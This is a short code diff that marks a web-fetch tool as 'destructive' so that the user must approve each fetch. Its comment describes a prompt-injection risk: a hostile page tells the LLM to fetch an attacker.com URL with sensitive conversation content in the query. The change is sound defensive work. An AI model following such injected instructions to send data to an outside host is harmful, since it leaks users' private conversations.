@@ -72,7 +72,14 @@ final class WebFetchAbility
             'meta' => [
                 'annotations' => [
                     'readonly' => true,
-                    'destructive' => false,
+                    // Marked destructive to trigger the approval flow even
+                    // though the fetch itself doesn't modify anything. The
+                    // risk is DATA EXFILTRATION: a prompt-injected page can
+                    // instruct the LLM to "fetch https://attacker.com/?data=
+                    // {sensitive conversation content}". The approval prompt
+                    // shows the full URL so the user can spot suspicious
+                    // destinations before the request goes out.
+                    'destructive' => true,
                     'idempotent' => true,
                 ],
             ],
